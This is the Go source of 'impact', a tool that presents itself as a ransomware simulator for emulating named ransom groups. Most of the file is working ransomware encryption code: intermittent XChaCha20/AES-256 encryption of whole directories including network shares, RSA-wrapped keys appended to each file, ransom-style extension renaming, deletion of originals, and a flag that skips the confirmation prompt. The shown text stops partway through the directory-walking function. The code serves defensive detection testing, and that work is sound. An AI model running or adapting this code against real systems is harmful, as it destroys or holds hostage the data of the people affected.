package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	r "crypto/rand"
	"crypto/rsa"
	"crypto/sha1"
	"crypto/x509"
	"encoding/pem"
	"errors"
	"flag"
	"fmt"
	"github.com/abakum/embed-encrypt/encryptedfs"
	"golang.org/x/crypto/chacha20"
	"gopkg.in/yaml.v3"
	"hash"
	"io"
	"math/rand"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"sync"
	"time"
)

// go run github.com/abakum/embed-encrypt - When config updates, use this to regenerate necessary data.

//encrypted:embed config.yaml
var configFile encryptedfs.FS

/*
//go:generate go run github.com/c-sto/encembed -i config.yaml -decvarname configFile
*/

type Config struct {
	Groups                  []RansomActor `yaml:"groups"`
	DirectoryExclusions     []string      `yaml:"directory_skips"`
	FileExtensionExclusions []string      `yaml:"file_extension_skips"`
	FileNameExclusions      []string      `yaml:"file_name_skips"`
	ProcessKillNames        []string      `yaml:"process_kill_names"`
}

type RansomActor struct {
	Group           string   `yaml:"group"`
	ExtensionMethod string   `yaml:"extension_method"`
	Extensions      []string `yaml:"extensions"`
	Notes           []string `yaml:"notes"`
	Note            string   `yaml:"note"`
	Cipher          string   `yaml:"cipher"`
}

type LogLevel string

const (
	INFO  LogLevel = "INFO"
	ERROR LogLevel = "ERROR"
)

type File struct {
	Path string // full path
	Size int64  // bytes
}

var dummy_extensions = []string{"docx", "docm", "xlsm", "xlsx", "qbw", "rar", "csv", "sln", "bin", "zip", "pdf", "txt"}
var subdir_names = []string{"finance", "reports", "documents", "it", "exhibits", "backup"}
var file_names = []string{"workbook", "report", "export", "timesheet", "evidence", "knowledge", "system", "adjustment", "observable", "genuine", "certificates", "judgement", "corporate", "domain", "tempest", "research", "hypothesis", "parallel"}
var subFileNames = []string{"base", "employee", "confidential", "sensitive", "markings", "delimited", "full", "temporary", "interim", "remarkable", "explicit", "absolute", "aws", "directreport", "hr", "it", "fin", "monthly", "quarterly", "daily"}

func printFormattedMessage(msg string, level LogLevel) {
	ts := time.Now().Format("2006-01-02T15:04:05.000Z")
	fmt.Printf("%s|%s| %s\n", ts, level, msg)
}

func parseArgs(groups []RansomActor) (map[string]any, error) {
	// Target Options
	targetDirectory := flag.String("directory", "", "Target Directory - can be UNC Path (\\\\localhost\\C$\\test) or Local (C:\\test)")
	method := flag.String("method", "inline", "inline - Read File, Encrypt in Memory, Write Modifications to Disk; outline - Read File, Encrypt to New File, Delete Original")
	recursive := flag.Bool("recursive", false, "Whether or not to encrypt all subdirs recursively or not")
	group := flag.String("group", "", "Specify a group to emulate - if none selected, will select one at random")
	list := flag.Bool("list", false, "List available groups to emulate")
	skip := flag.Bool("skipconfirm", false, "Skip Directory Confirmation Prompt (be careful!)")
	workers := flag.Int("workers", 25, "How many goroutines to use for encryption")

	// Encryption/Decryption Parameters - will override group settings if used for encryption/decryption
	rsa_public := flag.String("rsa_public", "", "Specify RSA Public-Key File - if none, will generate and write to file")
	rsa_private := flag.String("rsa_private", "", "Specify RSA Private-Key File - if none, will generate and write to file")
	decrypt := flag.Bool("decrypt", false, "Attempt to decrypt using specified options - must include RSA Private Key and Group Name OR Cipher Used")
	sym_cipher := flag.String("cipher", "", "Specify Symmetric Cipher for Encryption/Decryption")

	// Dummy Data Creation Parameters
	create := flag.Bool("create", false, "Create a mixture of dummy-data files in the target directory for encryption targeting - when using this, only files created by impact will be targeted for encryption, regardless of existence")
	create_count := flag.Int("create_files", 5000, "How many dummy-files to create")
	create_size := flag.Int("create_size", 5000, "Size in megabytes of dummy-file data to target - distributed evenly across create_files count")
	flag.Parse()

	if *targetDirectory == "" && !*list {
		return nil, errors.New("Empty Target Directory")
	}

	if *method != "inline" && *method != "outline" {
		return nil, errors.New("Invalid Encryption Method - must be 'inline' or 'outline")
	}

	// validate group
	selectedGroup := RansomActor{}
	if *group == "" {
		n := rand.Intn(len(groups))
		selectedGroup = groups[n]
	} else {
		match := false
		groupNames := ""
		for _, v := range groups {
			groupNames += fmt.Sprintf("%s | ", v.Group)
			if strings.ToLower(*group) == strings.ToLower(v.Group) {
				match = true
				selectedGroup = v
			}
		}
		if !match {
			return nil, errors.New(fmt.Sprintf("Invalid Group Name - must be one of the following: %s", groupNames))
		}
	}

	if *decrypt && *rsa_private == "" {
		return nil, errors.New(fmt.Sprintf("Must specify an RSA Private Key file when using -decrypt"))
	}
	if *decrypt && *sym_cipher == "" && *group == "" {
		return nil, errors.New(fmt.Sprintf("Must specify group or cipher when using -decrypt"))
	}

	if *rsa_private != "" {
		err := doesOSEntryExist(*rsa_private)
		if err != nil {
			return nil, errors.New(fmt.Sprintf("Error with specified RSA Private Key File: %s", err.Error()))
		}
	}

	if *rsa_public != "" {
		err := doesOSEntryExist(*rsa_public)
		if err != nil {
			return nil, errors.New(fmt.Sprintf("Error with specified RSA Public Key File: %s", err.Error()))
		}
	}

	arguments := map[string]any{
		"target":       *targetDirectory,
		"method":       *method,
		"group":        selectedGroup,
		"list":         *list,
		"skip":         *skip,
		"recursive":    *recursive,
		"create":       *create,
		"create_count": *create_count,
		"create_size":  *create_size,
		"workers":      *workers,
		"rsa_public":   *rsa_public,
		"rsa_private":  *rsa_private,
		"decrypt":      *decrypt,
		"sym_cipher":   *sym_cipher,
	}

	return arguments, nil
}

func main() {
	printFormattedMessage("impact - Adversary Ransomware Simulation", INFO)
	printFormattedMessage("For Questions or Issues: github.com/joeavanzato/impact", INFO)
	config, err := ReadConfig()
	if err != nil {
		printFormattedMessage(err.Error(), ERROR)
		return
	}
	args, err := parseArgs(config.Groups)
	if err != nil {
		printFormattedMessage(err.Error(), ERROR)
		return
	}
	group := args["group"].(RansomActor)
	target_dir := args["target"].(string)
	if args["list"].(bool) {
		printFormattedMessage(fmt.Sprintf(""), INFO)
		printFormattedMessage("Ransomware Group Details", INFO)
		for _, v := range config.Groups {
			printFormattedMessage(fmt.Sprintf("############"), INFO)
			printFormattedMessage(fmt.Sprintf("Group: %s", v.Group), INFO)
			printFormattedMessage(fmt.Sprintf("Extensions: %s", strings.Join(v.Extensions, ", ")), INFO)
			noteNames := make([]string, 0)
			for _, j := range v.Notes {
				noteNames = append(noteNames, j)
			}
			printFormattedMessage(fmt.Sprintf("Note Names: %s", strings.Join(noteNames, ", ")), INFO)
			printFormattedMessage(fmt.Sprintf("Cipher: %s", v.Cipher), INFO)
		}
		return
	}
	printFormattedMessage(fmt.Sprintf("Checking Target Directory: %s", target_dir), INFO)
	err = doesOSEntryExist(target_dir)
	if err != nil {
		printFormattedMessage(fmt.Sprintf("Target Directory Error: %s", err.Error()), INFO)
		return
	}

	// Need to create files now if performing
	fileList := make([]string, 0)
	if args["create"].(bool) {
		err, fileList = CreateFiles(args["create_count"].(int), args["create_size"].(int), target_dir)
		if err != nil {
			printFormattedMessage(err.Error(), ERROR)
			return
		}
		printFormattedMessage(fmt.Sprintf("Created %d Files in Target Directory", len(fileList)), INFO)
	}

	// We have valid group, directory, method at this point - now we want to determine if we are creating a subdir/files to simulate with or not
	printFormattedMessage(fmt.Sprintf("Simulating Group: %s", group.Group), INFO)
	extension := group.Extensions[rand.Intn(len(group.Extensions))]
	extension = replaceExtensionVariables(extension)
	note := replaceExtensionVariables(group.Note)
	noteName := group.Notes[rand.Intn(len(group.Notes))]
	method := args["method"].(string)

	if !args["skip"].(bool) {
		var con string
		if args["decrypt"].(bool) {
			fmt.Print("impact is about to decrypt data in target directory %s - please type 'confirm' to proceed:")
		} else {
			fmt.Print("impact is about to encrypt data in target directory %s - please type 'confirm' to proceed:")
		}
		fmt.Scan(&con)
		if con != "confirm" {
			printFormattedMessage(fmt.Sprintf("Abandoning Execution due to lack of confirmation: %s", con), ERROR)
			return
		}
	}

	// validate supplied cipher or group read
	sym_cipher := ""
	if args["sym_cipher"].(string) != "" {
		sym_cipher = strings.ToLower(args["sym_cipher"].(string))
	} else {
		sym_cipher = strings.ToLower(group.Cipher)
	}

	allowed_ciphers := []string{"xchacha20", "aes256"}
	if !slices.Contains(allowed_ciphers, sym_cipher) {
		printFormattedMessage(fmt.Sprintf("Cipher not implemented: %s", sym_cipher), ERROR)
		return
	}

	// Now we are ready to actually do encryption
	var ewg sync.WaitGroup
	fileTargetChannel := make(chan File)

	var rsaPrivateKey *rsa.PrivateKey
	var rsaPublicKey *rsa.PublicKey
	if args["decrypt"].(bool) {
		// User is decrypting data - thus, must supply an RSA private key
		rsaPrivateKey, err = getPrivateKeyFromFile(args["rsa_private"].(string))
		if err != nil {
			printFormattedMessage(fmt.Sprintf("Error reading supplied RSA Private Key: %s", err.Error()), ERROR)
			return
		}
	} else if args["rsa_public"].(string) != "" {
		// User is supplying public key to use for encryption
		rsaPublicKey, err = getPublicKeyFromFile(args["rsa_public"].(string))
		if err != nil {
			printFormattedMessage(fmt.Sprintf("Error reading supplied RSA Public Key: %s", err.Error()), ERROR)
			return
		}
		generateDecryptInstructions(target_dir, "{PRIVATE KEY FILE}", sym_cipher, args["recursive"].(bool))
	} else {
		// We are NOT decrypting and NOT using a known public key - so we generate them now and get the keys
		publicKeyFile, privateKeyFile := generateRSA()
		rsaPublicKey, err = getPublicKeyFromFile(publicKeyFile)
		if err != nil {
			printFormattedMessage(fmt.Sprintf("Error reading RSA Public Key: %s", err.Error()), ERROR)
			return
		}
		generateDecryptInstructions(target_dir, privateKeyFile, sym_cipher, args["recursive"].(bool))
		// We will use private key to generate decryption command for user,
	}

	// ewg is closed once all workers are finished encrypting, fileTargetChannel is closed once all files have been pushed to the channel
	for i := 0; i < args["workers"].(int); i++ {
		ewg.Add(1)
		go encryptionWorker(fileTargetChannel, &ewg, noteName, method, sym_cipher, extension, rsaPublicKey, rsaPrivateKey, args["decrypt"].(bool), group)
	}

	doEncryption(target_dir, note, noteName, args["recursive"].(bool), fileList, fileTargetChannel, args["decrypt"].(bool))
	ewg.Wait()
}

func generateDecryptInstructions(targetDir string, privateKeyFile string, cipher string, recurse bool) {
	decryptionCommand := fmt.Sprintf("impact -directory %s -skipconfirm -rsa_private %s -cipher %s -decrypt", targetDir, privateKeyFile, cipher)
	if recurse {
		decryptionCommand += " -recursive"
	}
	f, err := os.Create("decryption_command.txt")
	defer f.Close()
	if err != nil {
		printFormattedMessage(fmt.Sprintf("Error opening decryption command file: %s", err.Error()), ERROR)
		return
	}
	f.WriteString(decryptionCommand)
}

func getPublicKeyFromFile(file string) (*rsa.PublicKey, error) {
	pubKeyData, err := os.ReadFile(file)
	if err != nil {
		return nil, fmt.Errorf("Failed to read public key file: %v", err)
	}
	// Decode the PEM data
	block, _ := pem.Decode(pubKeyData)
	if block == nil || block.Type != "RSA PUBLIC KEY" {
		return nil, fmt.Errorf("Failed to decode PEM block containing public key")
	}

	// Parse the public key
	pub, err := x509.ParsePKCS1PublicKey(block.Bytes)
	if err != nil {
		return nil, fmt.Errorf("Failed to parse public key: %v", err)
	}
	return pub, nil
}

func getPrivateKeyFromFile(file string) (*rsa.PrivateKey, error) {
	keyData, err := os.ReadFile(file)
	if err != nil {
		return nil, fmt.Errorf("Failed to read private key file: %v", err)
	}
	// Decode the PEM data
	block, _ := pem.Decode(keyData)
	if block == nil || block.Type != "RSA PRIVATE KEY" {
		return nil, fmt.Errorf("Failed to decode PEM block containing private key")
	}
	// Parse the public key
	pri, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		return nil, fmt.Errorf("Failed to parse private key: %v", err)
	}
	return pri, nil
}

func generateRSA() (string, string) {

	filename := "rsa_key"
	bitSize := 4096

	rsakey, err := rsa.GenerateKey(r.Reader, bitSize)
	if err != nil {
		panic(err)
	}
	pub := rsakey.Public()

	// Encode private key to PKCS#1 ASN.1 PEM.
	keyPEM := pem.EncodeToMemory(
		&pem.Block{
			Type:  "RSA PRIVATE KEY",
			Bytes: x509.MarshalPKCS1PrivateKey(rsakey),
		},
	)

	// Encode public key to PKCS#1 ASN.1 PEM.
	pubPEM := pem.EncodeToMemory(
		&pem.Block{
			Type:  "RSA PUBLIC KEY",
			Bytes: x509.MarshalPKCS1PublicKey(pub.(*rsa.PublicKey)),
		},
	)

	// Typically, this is the key attacker would retain control of to generate decryptor
	if err := os.WriteFile(filename+".rsa", keyPEM, 0700); err != nil {
		panic(err)
	}

	if err := os.WriteFile(filename+".rsa.pub", pubPEM, 0755); err != nil {
		panic(err)
	}
	return filename + ".rsa.pub", filename + ".rsa"
}

func encryptionWorker(c chan File, ewg *sync.WaitGroup, noteName string, method string, cipher string, extension string, publicKey *rsa.PublicKey, privateKey *rsa.PrivateKey, decrypt bool, group RansomActor) {
	// Receives files to encrypt
	defer ewg.Done()
	for {
		file, ok := <-c
		if !ok {
			break
		} else {
			if filepath.Base(file.Path) == noteName {
				continue
			}
			if decrypt {
				if cipher == "xchacha20" {
					decryptFileXChaCha20(file, cipher, privateKey, group)
				} else if cipher == "aes256" {
					decryptFileAES256(file, privateKey, group)
				}
			} else {
				if cipher == "xchacha20" {
					encryptFileXChaCha20(file, method, extension, publicKey)
				} else if cipher == "aes256" {
					encryptFileAES256(file, method, extension, publicKey)
				}
			}
		}
	}

}

func encryptFileAES256(file File, method string, extension string, publicKey *rsa.PublicKey) {
	// Pretty much same as XChaCha20
	printFormattedMessage(fmt.Sprintf("Encrypting: "+file.Path), INFO)
	nonce := make([]byte, 16)
	c, emeddedData := getAES256Cipher(nil, nonce)

	inFile, err := os.Open(file.Path)
	if err != nil {
		printFormattedMessage(fmt.Sprintf("Error opening file: %s", file.Path), ERROR)
		return
	}
	defer inFile.Close()

	outFile, err := os.OpenFile(file.Path, os.O_RDWR, 0777)
	defer outFile.Close()
	if err != nil {
		printFormattedMessage(fmt.Sprintf("Error opening file: %s", file.Path), ERROR)
		return
	}

	if method == "outline" {
		outFile.Close()
		newPath := fmt.Sprintf("%s.%s", file.Path, extension)
		outFile, err = os.Create(newPath)
		defer outFile.Close()
		if err != nil {
			printFormattedMessage(fmt.Sprintf("Error opening file: %s", newPath), ERROR)
			return
		}
	}

	if file.Size <= 1024 {
		ptb := make([]byte, file.Size)
		ct := make([]byte, file.Size)
		_, err = inFile.Read(ptb)
		if err != nil {
			printFormattedMessage(fmt.Sprintf("Error encrypting file: %s", file.Path), ERROR)
			return
		}
		c.XORKeyStream(ct, ptb)
		outFile.Write(ct)

	} else {
		// AES-CTR produces 16-bytes for each operation
		// So we read 256 bytes - then we pass 64 of those for encryption - 64 in, 64 out

		br := bufio.NewReaderSize(inFile, 256)
		for true {
			ptb := make([]byte, 256)
			n, err := br.Read(ptb)
			if err != nil && !errors.Is(err, io.EOF) {
				printFormattedMessage(fmt.Sprintf("Error reading file %s, %s", file.Path, err.Error()), ERROR)
				return
			}
			if n < 256 {
				// Encrypt remainder since EOF
				pt := make([]byte, n)
				ct := make([]byte, n)
				pt = ptb[:n] // Remove any non-read bytes from the buffer
				c.XORKeyStream(ct, pt)
				outFile.Write(ct)
			} else {
				// should have read 256 bytes - we will encrypt just the 64 then write this back to the file along with remainder of 256 plain-text
				pt := make([]byte, 64)
				ct := make([]byte, 64)
				pt = ptb[:64]
				c.XORKeyStream(ct, pt)
				outFile.Write(ct)
				outFile.Write(ptb[64:])
			}
			if err != nil && errors.Is(err, io.EOF) {
				break
			}
		}
	}

	// Now we encrypt the KEY+NONCE and append to end of file
	cipherEmbeddedData, err := EncryptOAEP(sha1.New(), r.Reader, publicKey, emeddedData, nil)
	if err != nil {
		printFormattedMessage(fmt.Sprintf("Error encrypting symmetric key data: %s", err.Error()), ERROR)
		return
	}
	outFile.Write(cipherEmbeddedData)
	inFile.Close()
	outFile.Close()

	// Extension
	// Most of the time we can use a static one
	// We could also mutate the current extension with an embedded key or similar
	if method == "inline" {
		newPath := fmt.Sprintf("%s.%s", file.Path, extension)
		err = os.Rename(file.Path, newPath)
		if err != nil {
			printFormattedMessage(fmt.Sprintf("Error renaming encrypted file: %s", err.Error()), ERROR)
		}
	}

	if method == "outline" {
		// Delete original file
		os.Remove(file.Path)
		if err != nil {
			printFormattedMessage(fmt.Sprintf("Error deleting original file: %s", err.Error()), ERROR)
		}
	}

}

func decryptFileAES256(file File, privateKey *rsa.PrivateKey, group RansomActor) {
	printFormattedMessage(fmt.Sprintf("Decrypting: "+file.Path), INFO)
	inFile, err := os.Open(file.Path)
	if err != nil {
		printFormattedMessage(fmt.Sprintf("Error opening file: %s", file.Path), ERROR)
		return
	}
	defer inFile.Close()

	outFile, err := os.OpenFile(file.Path, os.O_RDWR, 0777)
	defer outFile.Close()
	if err != nil {
		printFormattedMessage(fmt.Sprintf("Error opening file: %s", file.Path), ERROR)
		return
	}
	b := make([]byte, 512)
	offset := file.Size - 512
	if offset <= 0 {
		// file not encrypted, otherwise it would have a minimum size greater than 0 due to our appended key
		return
	}
	inFile.ReadAt(b, offset)
	decryptEmbeddedData, err := DecryptOAEP(sha1.New(), r.Reader, privateKey, b, nil)
	if err != nil {
		printFormattedMessage(fmt.Sprintf("Error decrypting symmetric key data: %s", err.Error()), ERROR)
		return
	}
	sym_key := decryptEmbeddedData[0:32]
	nonce := decryptEmbeddedData[32:] // AES-CTR Nonce length
	c, _ := getAES256Cipher(sym_key, nonce)
	if file.Size-512 <= 1024 { // compare 'original' file size without our added signature
		inFile.Seek(0, 0)
		// 512 represents the number of bytes padded onto the file containing our asymmetric-encrypted symmetric key and nonce
		ct := make([]byte, file.Size-512)
		pt := make([]byte, file.Size-512)
		_, err = inFile.Read(ct)
		if err != nil {
			printFormattedMessage(fmt.Sprintf("Error decrypting file: %s", file.Path), ERROR)
			return
		}
		c.XORKeyStream(pt, ct)
		outFile.Write(pt)
	} else {
		// We need to decrypt up to file.Size-512 bytes since after that is our key
		// One approach would be immediately truncating the file to prevent
		// another is just looping through until we reach specified offset

		offset := int64(0)
		offsetTarget := file.Size - int64(512) // How do we prevent overflowing into this?
		// Each iteration we calculate (file.Size-512) which is the EOF range with offsetTarget
		// Once we reach a point where reading targetBytes will take us over, we trim our buffer to that and decrypt remainder and stop
		// As we read, we increase offset by 256
		lastBytesRead := int64(0)
		for true {
			final := false
			bytesToRead := int64(256)
			offset += lastBytesRead
			if offset+int64(256) >= offsetTarget {
				// If our next read will take us into key territory, adjust bytes read instead of 256 to the difference remaining and decrypt the remainder
				bytesToRead = offsetTarget - offset
				final = true
			}
			ctn := make([]byte, bytesToRead)
			bytesRead, err := inFile.ReadAt(ctn, offset)
			if err != nil {
				return
			}

			if bytesRead < 256 {
				// Decrypt remainder since EOF
				pt := make([]byte, bytesRead)
				ct := make([]byte, bytesRead)
				pt = ctn[:bytesRead] // Remove any non-read bytes from the buffer
				c.XORKeyStream(ct, pt)
				outFile.Write(ct)
			} else {
				// should have read 256 bytes - we will decrypt just the 64 then write this back to the file along with remainder of 256 plain-text
				pt := make([]byte, 64)
				ct := make([]byte, 64)
				ct = ctn[:64]
				//fmt.Println(len(ct))
				//fmt.Println(len(ctn[64:]))
				c.XORKeyStream(pt, ct)
				outFile.Write(pt)
				outFile.Write(ctn[64:])
			}

			lastBytesRead = int64(bytesRead)
			if final {
				// EOF
				break
			}

		}
	}

	outFile.Truncate(file.Size - 512)
	inFile.Close()
	outFile.Close()

	if group.ExtensionMethod == "append" {
		// Need to trim final extension
		newFileName := removeLastExtension(filepath.Base(file.Path))
		fileDir := filepath.Dir(file.Path)
		newPath := filepath.Join(fileDir, newFileName)
		err = os.Rename(file.Path, newPath)
		if err != nil {
			fmt.Println(err.Error())
		}
	}

}

func decryptFileXChaCha20(file File, cipher string, privateKey *rsa.PrivateKey, group RansomActor) {
	// First we need to check if the last 512 bytes of the file actually contains a key for us to decrypt using private key depending on cipher of choice
	// For XChaCha20, we should be able to read last 512 bits and convert split it into 32->24 byte array where 32=key and 24=nonce and generate a new unauthenticated cipher for use in decrypting rest of file
	// We skip the last 512 bits
	// DECRYPTION PROCESS
	// First, we read appropriate bytes from end of file backwards to get the ciphertext aes key
	// Then we decrypt using the privateKey
	// Then we decrypt file using plain-text symmetric key up to the byte where our key started and truncate from file
	printFormattedMessage(fmt.Sprintf("Decrypting: "+file.Path), INFO)
	inFile, err := os.Open(file.Path)
	if err != nil {
		printFormattedMessage(fmt.Sprintf("Error opening file: %s", file.Path), ERROR)
		return
	}
	defer inFile.Close()

	outFile, err := os.OpenFile(file.Path, os.O_RDWR, 0777)
	defer outFile.Close()
	if err != nil {
		printFormattedMessage(fmt.Sprintf("Error opening file: %s", file.Path), ERROR)
		return
	}
	b := make([]byte, 512)
	offset := file.Size - 512
	if offset <= 0 {
		// file not encrypted, otherwise it would have a minimum size greater than 0 due to our appended key
		return
	}
	inFile.ReadAt(b, offset)
	decryptEmbeddedData, err := DecryptOAEP(sha1.New(), r.Reader, privateKey, b, nil)
	if err != nil {
		printFormattedMessage(fmt.Sprintf("Error decrypting symmetric key data: %s", err.Error()), ERROR)
		return
	}
	sym_key := decryptEmbeddedData[0:32]
	nonce := decryptEmbeddedData[32:]
	c, _ := getXChaCha20Cipher(sym_key, nonce)
	if file.Size-512 <= 1024 { // compare 'original' file size without our added signature
		inFile.Seek(0, 0)
		// 512 represents the number of bytes padded onto the file containing our asymmetric-encrypted symmetric key and nonce
		ct := make([]byte, file.Size-512)
		pt := make([]byte, file.Size-512)
		_, err = inFile.Read(ct)
		if err != nil {
			printFormattedMessage(fmt.Sprintf("Error decrypting file: %s", file.Path), ERROR)
			return
		}
		c.XORKeyStream(pt, ct)
		outFile.Write(pt)
	} else {
		// We need to decrypt up to file.Size-512 bytes since after that is our key
		// One approach would be immediately truncating the file to prevent
		// another is just looping through until we reach specified offset

		offset := int64(0)
		offsetTarget := file.Size - int64(512) // How do we prevent overflowing into this?
		// Each iteration we calculate (file.Size-512) which is the EOF range with offsetTarget
		// Once we reach a point where reading targetBytes will take us over, we trim our buffer to that and decrypt remainder and stop
		// As we read, we increase offset by 256
		lastBytesRead := int64(0)
		for true {
			final := false
			bytesToRead := int64(256)
			offset += lastBytesRead
			if offset+int64(256) >= offsetTarget {
				// If our next read will take us into key territory, adjust bytes read instead of 256 to the difference remaining and decrypt the remainder
				bytesToRead = offsetTarget - offset
				final = true
			}
			ctn := make([]byte, bytesToRead)
			bytesRead, err := inFile.ReadAt(ctn, offset)
			if err != nil {
				return
			}

			if bytesRead < 256 {
				// Decrypt remainder since EOF
				pt := make([]byte, bytesRead)
				ct := make([]byte, bytesRead)
				pt = ctn[:bytesRead] // Remove any non-read bytes from the buffer
				c.XORKeyStream(ct, pt)
				outFile.Write(ct)
			} else {
				// should have read 256 bytes - we will decrypt just the 64 then write this back to the file along with remainder of 256 plain-text
				pt := make([]byte, 64)
				ct := make([]byte, 64)
				ct = ctn[:64]
				//fmt.Println(len(ct))
				//fmt.Println(len(ctn[64:]))
				c.XORKeyStream(pt, ct)
				outFile.Write(pt)
				outFile.Write(ctn[64:])
			}

			lastBytesRead = int64(bytesRead)
			if final {
				// EOF
				break
			}

		}
	}

	outFile.Truncate(file.Size - 512)
	inFile.Close()
	outFile.Close()

	if group.ExtensionMethod == "append" {
		// Need to trim final extension
		newFileName := removeLastExtension(filepath.Base(file.Path))
		fileDir := filepath.Dir(file.Path)
		newPath := filepath.Join(fileDir, newFileName)
		err = os.Rename(file.Path, newPath)
		if err != nil {
			fmt.Println(err.Error())
		}
	}

}

func removeLastExtension(filename string) string {
	ext := filepath.Ext(filename)
	if ext != "" {
		return strings.TrimSuffix(filename, ext)
	}
	return filename
}

func getXChaCha20Cipher(sym_key []byte, nonce []byte) (*chacha20.Cipher, []byte) {
	if sym_key == nil {
		sym_key = make([]byte, 32)
		if _, err := io.ReadFull(r.Reader, sym_key); err != nil {
			panic(err)
		}
	}
	if nonce == nil {
		// 192-bit nonce (24 bytes) for XChaCha20
		nonce = make([]byte, 24)
		if _, err := io.ReadFull(r.Reader, nonce); err != nil {
			panic(err)
		}
	}
	c, err := chacha20.NewUnauthenticatedCipher(sym_key, nonce)
	if err != nil {
		panic(err)
	}
	emeddedData := make([]byte, 0)
	emeddedData = append(emeddedData, sym_key...)
	emeddedData = append(emeddedData, nonce...)
	return c, emeddedData
}

func getAES256Cipher(sym_key []byte, nonce []byte) (cipher.Stream, []byte) {

	if sym_key == nil {
		sym_key = make([]byte, 32)
		if _, err := io.ReadFull(r.Reader, sym_key); err != nil {
			panic(err)
		}
	}
	if nonce == nil {
		nonce = make([]byte, 16)
		if _, err := io.ReadFull(r.Reader, nonce); err != nil {
			panic(err)
		}
	}

	block, err := aes.NewCipher(sym_key)
	if err != nil {
		panic(err.Error())
	}
	aesCTR := cipher.NewCTR(block, nonce)
	emeddedData := make([]byte, 0)
	emeddedData = append(emeddedData, sym_key...)
	emeddedData = append(emeddedData, nonce...)
	return aesCTR, emeddedData
}

func encryptFileXChaCha20(file File, method string, extension string, publicKey *rsa.PublicKey) {
	// ENCRYPTION PROCESS
	// The key is stored in memory and when encryption is completed, it is RSA encrypted and appended to the end of the file
	// If file size < 1024 bytes, encrypt entire file
	// If file size > 1024 bytes, encrypt 64, skip 192, encrypt 64, skip 192
	// Then we encrypt symmetric key with public key and append to file and save
	// Then we rename/delete file depending
	printFormattedMessage(fmt.Sprintf("Encrypting: "+file.Path), INFO)
	c, emeddedData := getXChaCha20Cipher(nil, nil)

	inFile, err := os.Open(file.Path)
	if err != nil {
		printFormattedMessage(fmt.Sprintf("Error opening file: %s", file.Path), ERROR)
		return
	}
	defer inFile.Close()

	outFile, err := os.OpenFile(file.Path, os.O_RDWR, 0777)
	defer outFile.Close()
	if err != nil {
		printFormattedMessage(fmt.Sprintf("Error opening file: %s", file.Path), ERROR)
		return
	}

	if method == "outline" {
		outFile.Close()
		newPath := fmt.Sprintf("%s.%s", file.Path, extension)
		outFile, err = os.Create(newPath)
		defer outFile.Close()
		if err != nil {
			printFormattedMessage(fmt.Sprintf("Error opening file: %s", newPath), ERROR)
			return
		}
	}

	if file.Size <= 1024 {
		ptb := make([]byte, file.Size)
		ct := make([]byte, file.Size)
		_, err = inFile.Read(ptb)
		if err != nil {
			printFormattedMessage(fmt.Sprintf("Error encrypting file: %s", file.Path), ERROR)
			return
		}

		c.XORKeyStream(ct, ptb)
		outFile.Write(ct)

	} else {
		// How do we handle this for decryption?
		// Need to make sure we always remove last 512 bytes of file from equation since that is our key then reverse the algorithm
		br := bufio.NewReaderSize(inFile, 256)
		// Encrypt 64, Leave 192, etc until last 256 bytes of file - then encrypt remainder
		for true {
			ptb := make([]byte, 256)
			n, err := br.Read(ptb)
			if err != nil && !errors.Is(err, io.EOF) {
				printFormattedMessage(fmt.Sprintf("Error reading file %s, %s", file.Path, err.Error()), ERROR)
				return
			}
			if n < 256 {
				// Encrypt remainder since EOF
				pt := make([]byte, n)
				ct := make([]byte, n)
				pt = ptb[:n] // Remove any non-read bytes from the buffer
				c.XORKeyStream(ct, pt)
				outFile.Write(ct)
			} else {
				// should have read 256 bytes - we will encrypt just the 64 then write this back to the file along with remainder of 256 plain-text
				pt := make([]byte, 64)
				ct := make([]byte, 64)
				pt = ptb[:64]
				c.XORKeyStream(ct, pt)
				outFile.Write(ct)
				outFile.Write(ptb[64:])
			}
			if err != nil && errors.Is(err, io.EOF) {
				break
			}
		}
	}

	// Now we encrypt the KEY+NONCE and append to end of file
	cipherEmbeddedData, err := EncryptOAEP(sha1.New(), r.Reader, publicKey, emeddedData, nil)
	if err != nil {
		printFormattedMessage(fmt.Sprintf("Error encrypting symmetric key data: %s", err.Error()), ERROR)
		return
	}
	outFile.Write(cipherEmbeddedData)
	inFile.Close()
	outFile.Close()

	// Extension
	// Most of the time we can use a static one
	// We could also mutate the current extension with an embedded key or similar
	if method == "inline" {
		newPath := fmt.Sprintf("%s.%s", file.Path, extension)
		err = os.Rename(file.Path, newPath)
		if err != nil {
			printFormattedMessage(fmt.Sprintf("Error renaming encrypted file: %s", err.Error()), ERROR)
		}
	}

	if method == "outline" {
		// Delete original file
		os.Remove(file.Path)
		if err != nil {
			printFormattedMessage(fmt.Sprintf("Error deleting original file: %s", err.Error()), ERROR)
		}
	}

}

// https://stackoverflow.com/questions/62348923/rs256-message-too-long-for-rsa-public-key-size-error-signing-jwt?answertab=votes#tab-top
func EncryptOAEP(hash hash.Hash, random io.Reader, public *rsa.PublicKey, msg []byte, label []byte) ([]byte, error) {
	msgLen := len(msg)
	step := public.Size() - 2*hash.Size() - 2
	var encryptedBytes []byte

	for start := 0; start < msgLen; start += step {
		finish := start + step
		if finish > msgLen {
			finish = msgLen
		}

		encryptedBlockBytes, err := rsa.EncryptOAEP(hash, random, public, msg[start:finish], label)
		if err != nil {
			return nil, err
		}

		encryptedBytes = append(encryptedBytes, encryptedBlockBytes...)
	}

	return encryptedBytes, nil
}

// https://stackoverflow.com/questions/62348923/rs256-message-too-long-for-rsa-public-key-size-error-signing-jwt?answertab=votes#tab-top
func DecryptOAEP(hash hash.Hash, random io.Reader, private *rsa.PrivateKey, msg []byte, label []byte) ([]byte, error) {
	msgLen := len(msg)
	step := private.PublicKey.Size()
	var decryptedBytes []byte

	for start := 0; start < msgLen; start += step {
		finish := start + step
		if finish > msgLen {
			finish = msgLen
		}

		decryptedBlockBytes, err := rsa.DecryptOAEP(hash, random, private, msg[start:finish], label)
		if err != nil {
			return nil, err
		}

		decryptedBytes = append(decryptedBytes, decryptedBlockBytes...)
	}

	return decryptedBytes, nil
}

func doEncryption(targetDir string, note string, noteName string, recursive bool, fileList []string, c chan File, decrypt bool) {
	// Each unique directory that we encounter, including base, should receive a ransomware note creation
	// If len(fileList) == 0, we did NOT create files explicitly for this test and as such, will be flat-scanning or recursively iterating
	// Flat scanning is easy - we can populate right now
	// TODO Exclusions of key dirs/file types
	ransomwareNoteDirs := make([]string, 0)
	if !recursive && len(fileList) == 0 {
		// We have not created any files to encrypt and just want top-level
